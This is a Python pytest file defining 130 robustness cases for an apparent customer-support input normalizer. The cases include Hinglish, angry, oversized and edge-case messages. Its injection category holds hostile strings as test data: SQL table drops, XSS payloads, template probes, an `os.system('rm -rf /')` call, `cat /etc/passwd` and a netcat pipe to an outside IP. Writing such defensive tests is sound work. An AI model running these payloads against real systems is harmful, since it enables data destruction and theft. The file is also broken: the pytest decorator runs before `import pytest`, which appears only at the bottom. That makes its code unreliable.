"""
Robustness test dataset — 130 test cases covering noisy, Hinglish, malicious inputs.
Run with: pytest tests/evaluation/ -v -m robustness
"""
from __future__ import annotations
from dataclasses import dataclass
from typing import Literal


@dataclass
class RobustnessCase:
    id: str
    input_text: str
    expected_outcome: Literal["normalize", "clarify", "fast_path", "agent", "sanitize"]
    category: str
    should_not_crash: bool = True
    max_latency_ms: float = 10_000.0


# ── Category 1: Empty / Near-Empty inputs (10 cases) ──────────
EMPTY_INPUTS: list[RobustnessCase] = [
    RobustnessCase("empty_001", "", "clarify", "empty"),
    RobustnessCase("empty_002", "  ", "clarify", "empty"),
    RobustnessCase("empty_003", "\n\n\n", "clarify", "empty"),
    RobustnessCase("empty_004", "\t", "clarify", "empty"),
    RobustnessCase("empty_005", ".", "clarify", "empty"),
    RobustnessCase("empty_006", "?", "clarify", "empty"),
    RobustnessCase("empty_007", "hi", "clarify", "too_short"),
    RobustnessCase("empty_008", "ok", "clarify", "too_short"),
    RobustnessCase("empty_009", "...", "clarify", "too_short"),
    RobustnessCase("empty_010", "   .  ", "clarify", "too_short"),
]

# ── Category 2: Injection attempts (20 cases) ──────────────────
INJECTION_INPUTS: list[RobustnessCase] = [
    RobustnessCase("inj_001", "SELECT * FROM users WHERE 1=1", "sanitize", "sql"),
    RobustnessCase("inj_002", "DROP TABLE tickets; --", "sanitize", "sql"),
    RobustnessCase("inj_003", "INSERT INTO users VALUES ('hacker')", "sanitize", "sql"),
    RobustnessCase("inj_004", "UNION SELECT password FROM users", "sanitize", "sql"),
    RobustnessCase("inj_005", "<script>alert('xss')</script>", "sanitize", "xss"),
    RobustnessCase("inj_006", "<img src=x onerror=alert(1)>", "sanitize", "xss"),
    RobustnessCase("inj_007", "javascript:alert(document.cookie)", "sanitize", "xss"),
    RobustnessCase("inj_008", "{{config}}", "sanitize", "template"),
    RobustnessCase("inj_009", "{{7*7}}", "sanitize", "template"),
    RobustnessCase("inj_010", "__import__('os').system('rm -rf /')", "sanitize", "code"),
    RobustnessCase("inj_011", "'; exec xp_cmdshell('dir'); --", "sanitize", "sql"),
    RobustnessCase("inj_012", "1; DROP TABLE audit_logs;", "sanitize", "sql"),
    RobustnessCase("inj_013", "<svg onload=alert(1)>", "sanitize", "xss"),
    RobustnessCase("inj_014", "eval(compile('import os; os.system(\"id\")', '<string>', 'exec'))", "sanitize", "code"),
    RobustnessCase("inj_015", "{{''.__class__.__mro__}}", "sanitize", "template"),
    RobustnessCase("inj_016", "; cat /etc/passwd", "sanitize", "shell"),
    RobustnessCase("inj_017", "| nc 1.2.3.4 4444", "sanitize", "shell"),
    RobustnessCase("inj_018", "TRUNCATE TABLE knowledge_base_chunks", "sanitize", "sql"),
    RobustnessCase("inj_019", "DELETE FROM users WHERE 1=1", "sanitize", "sql"),
    RobustnessCase("inj_020", "<iframe src=//evil.com>", "sanitize", "xss"),
]

# ── Category 3: Hinglish inputs (20 cases) ────────────────────
HINGLISH_INPUTS: list[RobustnessCase] = [
    RobustnessCase("hg_001", "Mera order kahan hai bhai?", "fast_path", "hinglish"),
    RobustnessCase("hg_002", "Order track karna hai", "fast_path", "hinglish"),
    RobustnessCase("hg_003", "Refund kab milega?", "fast_path", "hinglish"),
    RobustnessCase("hg_004", "Paise wapas karo please", "fast_path", "hinglish"),
    RobustnessCase("hg_005", "Invoice chahiye GST wala", "fast_path", "hinglish"),
    RobustnessCase("hg_006", "COD available hai kya?", "fast_path", "hinglish"),
    RobustnessCase("hg_007", "Delivery kab aayegi?", "agent", "hinglish"),
    RobustnessCase("hg_008", "Meri complaint register karo", "agent", "hinglish"),
    RobustnessCase("hg_009", "Product damage tha, return karna hai", "agent", "hinglish"),
    RobustnessCase("hg_010", "Account lock ho gaya", "agent", "hinglish"),
    RobustnessCase("hg_011", "Order status batao yaar", "fast_path", "hinglish"),
    RobustnessCase("hg_012", "Shipment track karo mera", "fast_path", "hinglish"),
    RobustnessCase("hg_013", "Refund status kya hai mera", "fast_path", "hinglish"),
    RobustnessCase("hg_014", "Bill download karna hai", "fast_path", "hinglish"),
    RobustnessCase("hg_015", "Warranty claim karna hai product ka", "agent", "hinglish"),
    RobustnessCase("hg_016", "Payment fail ho gaya", "agent", "hinglish"),
    RobustnessCase("hg_017", "Exchange possible hai kya?", "agent", "hinglish"),
    RobustnessCase("hg_018", "Order cancel karna hai abhi", "agent", "hinglish"),
    RobustnessCase("hg_019", "Ye fraud company hai, mera paisa wapas karo", "fast_path", "hinglish_aggressive"),
    RobustnessCase("hg_020", "Legal action lunga agar refund nahi mila", "agent", "hinglish_legal"),
]

# ── Category 4: Aggressive / Legal language (20 cases) ────────
AGGRESSIVE_INPUTS: list[RobustnessCase] = [
    RobustnessCase("agg_001", "This is a SCAM! Give me my money back NOW!", "agent", "aggressive"),
    RobustnessCase("agg_002", "I will file an FIR against your company", "agent", "legal"),
    RobustnessCase("agg_003", "Consumer Forum complaint filed. Respond immediately.", "agent", "legal"),
    RobustnessCase("agg_004", "WORST SERVICE EVER!!! SUE YOU ALL!!!", "agent", "aggressive"),
    RobustnessCase("agg_005", "You cheated me. Pathetic company.", "agent", "aggressive"),
    RobustnessCase("agg_006", "Disgusting service. Refund NOW or I go to court.", "agent", "legal"),
    RobustnessCase("agg_007", "I have recorded this conversation for legal purposes", "agent", "legal"),
    RobustnessCase("agg_008", "FRAUD FRAUD FRAUD THIS IS CHEATING", "agent", "aggressive"),
    RobustnessCase("agg_009", "I know where your office is", "agent", "aggressive"),
    RobustnessCase("agg_010", "Useless pathetic horrible company", "agent", "aggressive"),
    RobustnessCase("agg_011", "I'm going to post this on Twitter and get you trending", "agent", "social"),
    RobustnessCase("agg_012", "My lawyer has been informed already", "agent", "legal"),
    RobustnessCase("agg_013", "Filing RBI complaint against your payment practices", "agent", "regulatory"),
    RobustnessCase("agg_014", "National Consumer Disputes Redressal Commission", "agent", "regulatory"),
    RobustnessCase("agg_015", "GIVE ME MY MONEY YOU SCAMMERS!!!", "agent", "aggressive"),
    RobustnessCase("agg_016", "I will destroy your Google reviews", "agent", "social"),
    RobustnessCase("agg_017", "CBI complaint will be filed tomorrow morning", "agent", "legal"),
    RobustnessCase("agg_018", "Your company is running a Ponzi scheme", "agent", "defamatory"),
    RobustnessCase("agg_019", "I demand compensation of ₹1 crore for mental harassment", "agent", "legal"),
    RobustnessCase("agg_020", "I have 50K followers and will destroy your brand", "agent", "social"),
]

# ── Category 5: Long / Overflow inputs (10 cases) ─────────────
OVERFLOW_INPUTS: list[RobustnessCase] = [
    RobustnessCase("ovf_001", "a" * 1500, "normalize", "overflow", max_latency_ms=500),
    RobustnessCase("ovf_002", "help " * 300, "normalize", "overflow", max_latency_ms=500),
    RobustnessCase("ovf_003", "refund " * 400, "normalize", "overflow"),
    RobustnessCase("ovf_004", "🔥" * 200, "normalize", "unicode"),
    RobustnessCase("ovf_005", "order\n" * 500, "normalize", "overflow"),
    RobustnessCase("ovf_006", "SELECT " * 200 + "FROM users", "sanitize", "overflow_sql"),
    RobustnessCase("ovf_007", " ".join(["word"] * 1000), "normalize", "overflow"),
    RobustnessCase("ovf_008", "\x00\x01\x02" * 100, "normalize", "binary"),
    RobustnessCase("ovf_009", "ह" * 500, "normalize", "unicode_hindi"),
    RobustnessCase("ovf_010", "a" * 999 + "b", "normalize", "boundary"),
]

# ── Category 6: Fast-path exact matches (20 cases) ─────────────
FAST_PATH_INPUTS: list[RobustnessCase] = [
    RobustnessCase("fp_001", "Where is my order?", "fast_path", "tracking", max_latency_ms=200),
    RobustnessCase("fp_002", "track my order", "fast_path", "tracking", max_latency_ms=200),
    RobustnessCase("fp_003", "order status please", "fast_path", "tracking", max_latency_ms=200),
    RobustnessCase("fp_004", "what is my shipment status", "fast_path", "tracking", max_latency_ms=200),
    RobustnessCase("fp_005", "delivery status update", "fast_path", "tracking", max_latency_ms=200),
    RobustnessCase("fp_006", "refund status check", "fast_path", "refund", max_latency_ms=200),
    RobustnessCase("fp_007", "when will I get my refund", "fast_path", "refund", max_latency_ms=200),
    RobustnessCase("fp_008", "my refund is pending", "fast_path", "refund", max_latency_ms=200),
    RobustnessCase("fp_009", "download GST invoice", "fast_path", "invoice", max_latency_ms=200),
    RobustnessCase("fp_010", "I need invoice copy", "fast_path", "invoice", max_latency_ms=200),
    RobustnessCase("fp_011", "GST invoice download karna hai", "fast_path", "invoice", max_latency_ms=200),
    RobustnessCase("fp_012", "COD available for my area?", "fast_path", "cod", max_latency_ms=200),
    RobustnessCase("fp_013", "cash on delivery option?", "fast_path", "cod", max_latency_ms=200),
    RobustnessCase("fp_014", "is COD available", "fast_path", "cod", max_latency_ms=200),
    RobustnessCase("fp_015", "tracking number please", "fast_path", "tracking", max_latency_ms=200),
    RobustnessCase("fp_016", "where is my package?", "fast_path", "tracking", max_latency_ms=200),
    RobustnessCase("fp_017", "refund kab milega", "fast_path", "refund", max_latency_ms=200),
    RobustnessCase("fp_018", "paise wapas karo", "fast_path", "refund", max_latency_ms=200),
    RobustnessCase("fp_019", "invoice chahiye", "fast_path", "invoice", max_latency_ms=200),
    RobustnessCase("fp_020", "kahan hai mera order", "fast_path", "tracking", max_latency_ms=200),
]

# ── Category 7: Edge cases (30 cases) ─────────────────────────
EDGE_CASES: list[RobustnessCase] = [
    RobustnessCase("edge_001", "1234567890", "clarify", "numeric_only"),
    RobustnessCase("edge_002", "!@#$%^&*()", "clarify", "special_chars"),
    RobustnessCase("edge_003", "नमस्ते मुझे मदद चाहिए", "agent", "pure_hindi"),
    RobustnessCase("edge_004", "Hello hello hello hello hello hello", "agent", "repetitive"),
    RobustnessCase("edge_005", "URGENT URGENT URGENT HELP NOW", "agent", "capslock"),
    RobustnessCase("edge_006", "order order order order order", "fast_path", "repetitive_keyword"),
    RobustnessCase("edge_007", "Can you please help me with my issue?", "agent", "vague"),
    RobustnessCase("edge_008", "None", "agent", "python_none_str"),
    RobustnessCase("edge_009", "null", "agent", "null_str"),
    RobustnessCase("edge_010", "undefined", "agent", "undefined_str"),
    RobustnessCase("edge_011", "true", "agent", "bool_str"),
    RobustnessCase("edge_012", "0", "clarify", "zero"),
    RobustnessCase("edge_013", "-1", "clarify", "negative"),
    RobustnessCase("edge_014", "Order ID: ORD-2024-ABC123 not delivered", "fast_path", "with_order_id"),
    RobustnessCase("edge_015", "Re: Re: Re: Fwd: Ticket #12345", "agent", "email_thread"),
    RobustnessCase("edge_016", "www.google.com click this link", "agent", "with_url"),
    RobustnessCase("edge_017", "My email is hacker@evil.com", "agent", "with_email"),
    RobustnessCase("edge_018", "Credit card: 4532 1234 5678 9010", "agent", "pii"),
    RobustnessCase("edge_019", "My Aadhaar is 1234 5678 9012", "agent", "pii_aadhaar"),
    RobustnessCase("edge_020", "Call me at +91-98765-43210", "agent", "pii_phone"),
    RobustnessCase("edge_021", "track\x00order", "normalize", "null_byte"),
    RobustnessCase("edge_022", "order " * 5 + "status", "fast_path", "padded"),
    RobustnessCase("edge_023", "TRACK MY ORDER", "fast_path", "uppercase"),
    RobustnessCase("edge_024", "tRaCk My OrDeR", "fast_path", "mixed_case"),
    RobustnessCase("edge_025", "  track my order  ", "fast_path", "whitespace_padded"),
    RobustnessCase("edge_026", "refund\nstatus\nplease", "fast_path", "multiline"),
    RobustnessCase("edge_027", "a" * 1000, "normalize", "exact_boundary"),
    RobustnessCase("edge_028", "a" * 1001, "normalize", "over_boundary"),
    RobustnessCase("edge_029", "😤 My order is late 😡", "fast_path", "emoji"),
    RobustnessCase("edge_030", "📦 track order 🔍", "fast_path", "emoji_order"),
]

# ── Full dataset ───────────────────────────────────────────────
ALL_CASES: list[RobustnessCase] = (
    EMPTY_INPUTS
    + INJECTION_INPUTS
    + HINGLISH_INPUTS
    + AGGRESSIVE_INPUTS
    + OVERFLOW_INPUTS
    + FAST_PATH_INPUTS
    + EDGE_CASES
)

assert len(ALL_CASES) == 130, f"Expected 130 cases, got {len(ALL_CASES)}"


# ── Pytest-parametrize integration ────────────────────────────
@pytest.mark.parametrize("case", ALL_CASES, ids=[c.id for c in ALL_CASES])
def test_no_crash_on_input(case: RobustnessCase):
    """Invariant 21: crash_rate = 0% — InputNormalizer must never raise."""
    import pytest
    from app.core.fastpath import input_normalizer
    try:
        result = input_normalizer.normalize(case.input_text)
        assert result is not None, f"normalize() returned None for case {case.id}"
    except Exception as e:
        pytest.fail(f"InputNormalizer crashed on case {case.id}: {e}")


import pytest  # noqa: E402
